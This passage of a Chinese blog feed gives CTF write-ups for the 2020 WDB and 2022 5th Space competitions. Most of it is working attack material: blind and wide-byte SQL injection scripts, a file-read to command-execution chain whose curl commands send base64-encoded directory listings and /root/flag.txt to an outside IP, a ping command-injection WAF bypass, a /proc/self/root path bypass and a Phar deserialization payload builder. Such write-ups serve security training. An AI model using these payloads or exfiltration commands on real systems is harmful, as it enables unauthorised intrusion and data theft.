&lt;/span&gt;&#x27;</span>.encode() <span class="keyword">in</span> res.content:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">reg</span>(<span class="params">u, e</span>):</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;username&quot;</span>: u,</span><br><span class="line">        <span class="string">&quot;email&quot;</span>: e,</span><br><span class="line">        <span class="string">&quot;password&quot;</span>: <span class="string">&quot;123456&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    res = req.post(URL + <span class="string">&#x27;/register.php&#x27;</span>, data, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">if</span> res.status_code == <span class="number">302</span>:</span><br><span class="line">        <span class="keyword">return</span> login(e)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">table = <span class="string">&#x27;qwertyuiopasdfghjklzxcvbnm&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">b</span>(<span class="params">pl</span>):</span><br><span class="line">    email = <span class="string">&#x27;&#x27;</span>.join(random.sample(table, <span class="number">8</span>)) + <span class="string">&#x27;@qq.com&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> reg(pl, email)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getLen</span>(<span class="params">sql</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] Starting getLen...&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">60</span>):</span><br><span class="line">        sys.stdout.write(<span class="string">&quot;[+] Len : -&gt; %d &lt;-\r&quot;</span> % i)</span><br><span class="line">        sys.stdout.flush()</span><br><span class="line">        <span class="keyword">if</span> b(<span class="string">&quot;1&#x27;and((select length((%s)))=%d)and&#x27;1&quot;</span> % (sql, i)):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[+] Len : -&gt; %d &lt;-&quot;</span> % i)</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getData</span>(<span class="params">sql=<span class="string">&quot;version()&quot;</span></span>):</span><br><span class="line">    _<span class="built_in">len</span> = getLen(sql)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> _<span class="built_in">len</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] getLen &#x27;Error&#x27;&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] Starting getData...&quot;</span>)</span><br><span class="line">    table = <span class="string">&#x27;&#125;&#123;1234567890.-@_qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM&#x27;</span></span><br><span class="line">    res = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> pos <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, _<span class="built_in">len</span> + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> ch <span class="keyword">in</span> table:</span><br><span class="line">            sys.stdout.write(<span class="string">&quot;[+] Result : -&gt; %s%c &lt;-\r&quot;</span> % (res, ch))</span><br><span class="line">            sys.stdout.flush()</span><br><span class="line">            pl = <span class="string">&quot;1&#x27;and((select substr((%s)from(%d)for(1))=&#x27;%s&#x27;))and&#x27;1&quot;</span> % (</span><br><span class="line">                sql, pos, ch)</span><br><span class="line">            <span class="keyword">if</span> b(pl):</span><br><span class="line">                res += ch</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] Result : -&gt; %s &lt;- &quot;</span> % res)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># right(left(x,pos),1)</span></span><br><span class="line"><span class="comment"># mid(x,pos,1)</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># pl = &quot;(select substr((version())from(1)for(1))=&#x27;%s&#x27;)&quot; % &#x27;5&#x27;</span></span><br><span class="line">    <span class="comment"># pl = &quot;1&#x27;and(%s)and&#x27;1&quot; % pl</span></span><br><span class="line">    <span class="comment"># print(b(pl))</span></span><br><span class="line">    pl = <span class="string">&#x27;version()&#x27;</span></span><br><span class="line">    pl = <span class="string">&#x27;select t.c from (select (select 1)c union select * from flag)t limit 1 offset 1&#x27;</span></span><br><span class="line">    getData(pl)</span><br></pre></td></tr></table></figure>
<h4 id="picdown">picdown</h4>
<p>任意文件读取，字典<strong>fuzz</strong>一下，<strong>/proc/self/cmdline</strong>有提示源码位置。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/root/.pyenv/versions/2.7.1/bin/python main.py </span><br></pre></td></tr></table></figure>
<p>同时<strong>/proc/self/fd/3</strong>下有<strong>key</strong>。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">N6UnR%2Bckjbyovd1o2ycsS%2B%2FvRXEJCvDomsZo72U1Uu8%3D</span><br></pre></td></tr></table></figure>
<p><strong>/page?url=main.py</strong>读一下源代码。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, Response</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">SECRET_FILE = <span class="string">&quot;/tmp/secret.txt&quot;</span></span><br><span class="line">f = <span class="built_in">open</span>(SECRET_FILE)</span><br><span class="line">SECRET_KEY = f.read().strip()</span><br><span class="line">os.remove(SECRET_FILE)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;search.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/page&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">page</span>():</span><br><span class="line">    url = request.args.get(<span class="string">&quot;url&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> url.lower().startswith(<span class="string">&quot;file&quot;</span>):</span><br><span class="line">            res = urllib.urlopen(url)</span><br><span class="line">            value = res.read()</span><br><span class="line">            response = Response(value, mimetype=<span class="string">&#x27;application/octet-stream&#x27;</span>)</span><br><span class="line">            response.headers[<span class="string">&#x27;Content-Disposition&#x27;</span>] = <span class="string">&#x27;attachment; filename=beautiful.jpg&#x27;</span></span><br><span class="line">            <span class="keyword">return</span> response</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            value = <span class="string">&quot;HACK ERROR!&quot;</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        value = <span class="string">&quot;SOMETHING WRONG!&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;search.html&#x27;</span>, res=value)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/no_one_know_the_manager&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">manager</span>():</span><br><span class="line">    key = request.args.get(<span class="string">&quot;key&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(SECRET_KEY)</span><br><span class="line">    <span class="keyword">if</span> key == SECRET_KEY:</span><br><span class="line">        shell = request.args.get(<span class="string">&quot;shell&quot;</span>)</span><br><span class="line">        os.system(shell)</span><br><span class="line">        res = <span class="string">&quot;ok&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        res = <span class="string">&quot;Wrong Key!&quot;</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8080</span>)</span><br></pre></td></tr></table></figure>
<p>根据源码，直接命令执行。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/no_one_know_the_manager?key=N6UnR%2Bckjbyovd1o2ycsS%2B%2FvRXEJCvDomsZo72U1Uu8%3D&amp;shell=curl%20122.51.113.164</span><br><span class="line"></span><br><span class="line">/no_one_know_the_manager?key=N6UnR%2Bckjbyovd1o2ycsS%2B%2FvRXEJCvDomsZo72U1Uu8%3D&amp;shell=curl%20122.51.113.164/`ls%20/|base64`</span><br><span class="line"></span><br><span class="line">/no_one_know_the_manager?key=N6UnR%2Bckjbyovd1o2ycsS%2B%2FvRXEJCvDomsZo72U1Uu8%3D&amp;shell=curl%20122.51.113.164/`ls%20/root|base64`</span><br><span class="line"></span><br><span class="line">/no_one_know_the_manager?key=N6UnR%2Bckjbyovd1o2ycsS%2B%2FvRXEJCvDomsZo72U1Uu8%3D&amp;shell=curl%20122.51.113.164/`cat%20/root/flag.txt|base64`</span><br></pre></td></tr></table></figure>
<h4 id="starbucket">starbucket</h4>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="title function_">fetch</span>(<span class="string">&#x27;./signature.php?acl=public-read-write&amp;key=userinfo/&#x27;</span> + userid + <span class="string">&#x27;/info.js&#x27;</span>)</span><br><span class="line">    .<span class="title function_">then</span>(<span class="function"><span class="params">res</span> =&gt;</span> res.<span class="title function_">json</span>())</span><br><span class="line">    .<span class="title function_">then</span>(<span class="function"><span class="params">json</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> json) &#123;</span><br><span class="line">            $(<span class="string">&#x27;input[name=&#x27;</span> + key + <span class="string">&#x27;]&#x27;</span>)[<span class="number">0</span>].<span class="property">value</span> = json[key];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br></pre></td></tr></table></figure>
<p>上传覆盖<strong>info.js</strong>的内容。</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;admin&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span><span class="attr">&quot;avatar&quot;</span><span class="punctuation">:</span><span class="string">&quot;image\/default.jpg&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
<p>访问首页就有了。</p>
<h3 id="reverse">Reverse</h3>
<h4 id="恶龙">恶龙</h4>
<p><strong>Ida</strong>直接<strong>patch</strong>，小端序。</p>
<figure>
<img src="/images/2020-WDB-White-Tiger/image-20200604235835147.png"
alt="image-20200604235835147" />
<figcaption aria-hidden="true">image-20200604235835147</figcaption>
</figure>
<p>然后导出运行。</p>
<figure>
<img src="/images/2020-WDB-White-Tiger/image-20200604235949147.png"
alt="image-20200604235949147" />
<figcaption aria-hidden="true">image-20200604235949147</figcaption>
</figure>
<h3 id="misc">Misc</h3>
<h4 id="py">py</h4>
<p><strong>pyi-archive_viewer src</strong>。</p>
<figure>
<img src="/images/2020-WDB-White-Tiger/image-20200605000012863.png"
alt="image-20200605000012863" />
<figcaption aria-hidden="true">image-20200605000012863</figcaption>
</figure>
<p>打开就有<strong>flag</strong>。</p>
<h4 id="b64">b64</h4>
<p>整不明白。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">cipher = <span class="string">&quot;uLdAuO8duojAFLEKjIgdpfGeZoELjJp9kSieuIsAjJ/LpSXDuCGduouz&quot;</span></span><br><span class="line">original_format = <span class="string">&quot;flag&#123;de63de21-082b-4a9d-acbd-7d47a55840c6&#125;&quot;</span></span><br><span class="line">leak_cipher = <span class="string">&quot;pTjMwJ9WiQHfvC+eFCFKTBpWQtmgjopgqtmPjfKfjSmdFLpeFf/Aj2ud3tN7u2+enC9+nLN8kgdWo29ZnCrOFCDdFCrOFoF=&quot;</span></span><br><span class="line">leak_plain = <span class="string">&quot;ashlkj!@sj1223%^&amp;*Sd4564sd879s5d12f231a46qwjkd12J;DJjl;LjL;KJ8729128713&quot;</span></span><br><span class="line">base64_table = [<span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;E&#x27;</span>, <span class="string">&#x27;F&#x27;</span>, <span class="string">&#x27;G&#x27;</span>, <span class="string">&#x27;H&#x27;</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;J&#x27;</span>, <span class="string">&#x27;K&#x27;</span>, <span class="string">&#x27;L&#x27;</span>, <span class="string">&#x27;M&#x27;</span>, <span class="string">&#x27;N&#x27;</span>, <span class="string">&#x27;O&#x27;</span>, <span class="string">&#x27;P&#x27;</span>, <span class="string">&#x27;Q&#x27;</span>, <span class="string">&#x27;R&#x27;</span>, <span class="string">&#x27;S&#x27;</span>, <span class="string">&#x27;T&#x27;</span>, <span class="string">&#x27;U&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;V&#x27;</span>, <span class="string">&#x27;W&#x27;</span>, <span class="string">&#x27;X&#x27;</span>, <span class="string">&#x27;Y&#x27;</span>, <span class="string">&#x27;Z&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;j&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;p&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;q&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;v&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, <span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;y&#x27;</span>, <span class="string">&#x27;z&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;+&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;/&#x27;</span>, ]</span><br><span class="line">base_split_step = <span class="number">6</span></span><br><span class="line">dic = []</span><br><span class="line">s2b_step = <span class="number">3</span></span><br><span class="line">b2s_step = <span class="number">4</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(leak_plain), s2b_step):</span><br><span class="line">    res = leak_plain[i:i + s2b_step]</span><br><span class="line">    rr = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> res:</span><br><span class="line">        rr += <span class="built_in">bin</span>(<span class="built_in">ord</span>(j))[<span class="number">2</span>:].zfill(<span class="number">8</span>)</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(rr), base_split_step):</span><br><span class="line">        dic.append(rr[k:k + base_split_step].ljust(<span class="number">6</span>, <span class="string">&quot;0&quot;</span>))</span><br><span class="line"></span><br><span class="line">res_dict = &#123;&#125;</span><br><span class="line">rd = []</span><br><span class="line"><span class="keyword">for</span> i, j <span class="keyword">in</span> <span class="built_in">zip</span>(leak_cipher, dic):</span><br><span class="line">    <span class="comment"># res_dict[i] = j</span></span><br><span class="line">    res_dict[i] = <span class="built_in">int</span>(j, <span class="number">2</span>)</span><br><span class="line">    rd.append(i)</span><br><span class="line"><span class="built_in">print</span>(res_dict)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">set</span>(base64_table) - <span class="built_in">set</span>(rd))</span><br><span class="line"></span><br><span class="line">non_existent = []</span><br><span class="line">translate = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> cipher:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        translate += base64_table[res_dict[i]]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        translate += i</span><br><span class="line">        non_existent.append(i)</span><br><span class="line">non_existent = <span class="built_in">set</span>(non_existent)</span><br><span class="line"><span class="built_in">print</span>(non_existent)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">int</span>(<span class="built_in">len</span>(cipher) / b2s_step)):</span><br><span class="line">    tmp = translate[i * b2s_step:(i + <span class="number">1</span>) * b2s_step]</span><br><span class="line">    tmp_format = original_format[i * s2b_step:(i + <span class="number">1</span>) * s2b_step]</span><br><span class="line">    <span class="comment"># print(tmp, tmp_format)</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> tmp:</span><br><span class="line">        <span class="keyword">if</span> j <span class="keyword">in</span> non_existent:</span><br><span class="line">            <span class="built_in">print</span>(tmp, tmp_format)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>题解</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>2022 第五空间 线上初赛 部分题解</title>
    <url>/2022-5Space-Preliminary/</url>
    <content><![CDATA[<p>好累的一天。</p>
<span id="more"></span>
<h1 id="web">Web</h1>
<h2 id="web_letmeguess_1">5_web_letmeguess_1</h2>
<p>弱口令<strong>admin/admin123</strong>。</p>
<p><strong>ping</strong>命令注入，<strong>%0a</strong>绕过分隔符。</p>
<p>发现存在<strong>kylin</strong>目录，目录下存在<strong>flag.txt</strong>，且<strong>WAF</strong>过滤了<strong>kylin</strong>和<strong>flag</strong>，使用*****绕过。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1%0acd$&#123;IFS&#125;ky*%0atac$&#123;IFS&#125;fl*</span><br></pre></td></tr></table></figure>
<h2 id="easylogin">5_easylogin</h2>
<p>在<strong>username</strong>处存在宽字节注入，并且题目将<strong>union
select</strong>替换为空，双写绕过，并且构造一个<strong>admin</strong>用户密码。</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/login.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>39.105.13.61:10808</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>140</span><br><span class="line"><span class="attribute">Pragma</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://39.105.13.61:10808</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://39.105.13.61:10808/login.php</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">password</span>=<span class="number">3</span>&amp;username=-<span class="number">100</span>%df&#x27;uniunionon/**/seleselectct/**/<span class="number">1</span>,<span class="number">0</span>x61646D696E,<span class="number">0</span>x6563636263383765346235636532666532383330386664396632613762616633#</span></span><br></pre></td></tr></table></figure>
<h2 id="web_eeeeasy_sql">5_web_Eeeeasy_SQL</h2>
<p><strong>\</strong>逃逸<strong>'</strong>，<strong>mysql8
table</strong>注入。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">burp0_url = <span class="string">&quot;http://39.107.68.209:45231/api/api.php?command=login&quot;</span></span><br><span class="line">burp0_headers = &#123;<span class="string">&quot;Cache-Control&quot;</span>: <span class="string">&quot;max-age=0&quot;</span>, <span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">                 <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>,</span><br><span class="line">                 <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36&quot;</span>,</span><br><span class="line">                 <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;</span>,</span><br><span class="line">                 <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>,</span><br><span class="line">                 <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9&quot;</span>, <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>&#125;</span><br><span class="line">res = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">40</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">128</span>):</span><br><span class="line">        <span class="comment"># password = &quot;union values row((case when ord(right(database(),%s))&gt;%s then 1 else (~(0)+1) end),2,3,4)#&quot; % (i, j)</span></span><br><span class="line">        tmp = res + <span class="built_in">chr</span>(j)</span><br><span class="line">        <span class="built_in">print</span>(tmp)</span><br><span class="line">        password = <span class="string">&quot;union values row((case when (table ctf.users limit 2,1)&gt;(3,0x466c61675f4163636f756e74,binary %s,1) then 1 else (~(0)+1) end),2,3,4)#&quot;</span>.replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;\t&quot;</span>) % (<span class="string">&quot;0x&quot;</span> + tmp.encode().<span class="built_in">hex</span>())</span><br><span class="line">        burp0_data = &#123;<span class="string">&quot;username&quot;</span>: <span class="string">&quot;admin\\&quot;</span>, <span class="string">&quot;password&quot;</span>: password&#125;</span><br><span class="line">        <span class="comment"># print(password)</span></span><br><span class="line">        r = requests.post(burp0_url, headers=burp0_headers, data=burp0_data, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;success&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="comment"># print(r.text)</span></span><br><span class="line">            res += <span class="built_in">chr</span>(j - <span class="number">1</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">chr</span>(j - <span class="number">1</span>))</span><br><span class="line">            <span class="comment"># print(res[::-1])</span></span><br><span class="line">            <span class="built_in">print</span>(res)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="comment"># id为2</span></span><br><span class="line"><span class="comment"># ADMIN@665</span></span><br><span class="line"><span class="comment"># Flag_Account</span></span><br><span class="line"><span class="comment"># G1VE_Y0U_@_K3Y_70_937_F14G!!!</span></span><br><span class="line"><span class="comment"># G1ve_Y0u_@_K3y_70_937_f14g!!!</span></span><br></pre></td></tr></table></figure>
<p>登入后。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>] === <span class="string">&#x27;Flag_Account&#x27;</span>) &#123;</span><br><span class="line">        <span class="variable">$file</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^\/flag|var|tmp|php|log|\%|sess|etc|usr|\.|\:|base|ssh|http/i&#x27;</span>, <span class="variable">$file</span>)) &#123;</span><br><span class="line">            <span class="title function_ invoke__">readfile</span>(<span class="variable">$file</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;try again~&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;登陆一下吧~&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>符号链接绕过。</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">GET /api/flag.php?file=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/flag</span><br></pre></td></tr></table></figure>
<h2 id="web_baliyun">5_web_BaliYun</h2>
<p>直接<strong>Phar</strong>反序列化。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">upload</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ext</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$size</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Valid_ext</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filename = <span class="string">&#x27;/flag&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;GIF89a&quot;</span> . <span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line"><span class="variable">$o</span> = <span class="keyword">new</span> <span class="title function_ invoke__">upload</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="comment">//签名自动计算</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span 